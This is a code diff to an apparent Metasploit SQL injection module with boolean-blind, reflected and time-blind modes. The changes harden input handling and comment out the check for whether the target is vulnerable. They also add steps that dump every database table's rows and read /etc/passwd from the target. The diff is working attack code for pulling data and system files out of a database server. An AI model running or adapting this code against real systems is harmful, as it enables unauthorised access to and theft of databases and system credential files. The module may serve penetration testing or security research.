@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def boolean_blind
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = create_sqli(dbms: @dbms, opts: {
       encoder: encoder,
       hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def reflected
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     truncation = datastore['TRUNCATION_LENGTH'] <= 0 ? nil : datastore['TRUNCATION_LENGTH']
     sqli = create_sqli(dbms: @dbms, opts: {
       encoder: encoder,
@@ -69,19 +69,26 @@ class MetasploitModule < Msf::Auxiliary
     }) do |payload|
       sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
       sock.puts('0 union ' + payload)
-      res = sock.gets&.chomp
+      res = ""
+      begin
+        while true
+          res += sock.readline
+        end
+      rescue EOFError
+        vprint_status("Hit end of file...")
+      end
       sock.close
       truncation ? res[0, truncation] : res
     end
-    unless sqli.test_vulnerable
-      print_bad("Doesn't seem to be vulnerable")
-      return
-    end
+    #unless sqli.test_vulnerable
+    #  print_bad("Doesn't seem to be vulnerable")
+    #  return
+    #end
     perform_sqli(sqli)
   end
 
   def time_blind
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = create_sqli(dbms: @dbms, opts: {
       encoder: encoder,
       hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
@@ -109,15 +116,19 @@ class MetasploitModule < Msf::Auxiliary
   def perform_sqli(sqli)
     print_good "dbms version: #{sqli.version}"
     tables = sqli.enum_table_names
+    tables.map! { |table| table.strip }
     print_good "tables: #{tables.join(', ')}"
     tables.each do |table|
       columns = sqli.enum_table_columns(table)
+      columns.map! { |column| column.strip }
       print_good "#{table}(#{columns.join(', ')})"
       content = sqli.dump_table_fields(table, columns)
       content.each do |row|
         print_good "\t" + row.join(', ')
       end
     end
+    passwd_content = sqli.read_from_file('/etc/passwd')
+    print_good("Got #{passwd_content}")
   end
 
   def run
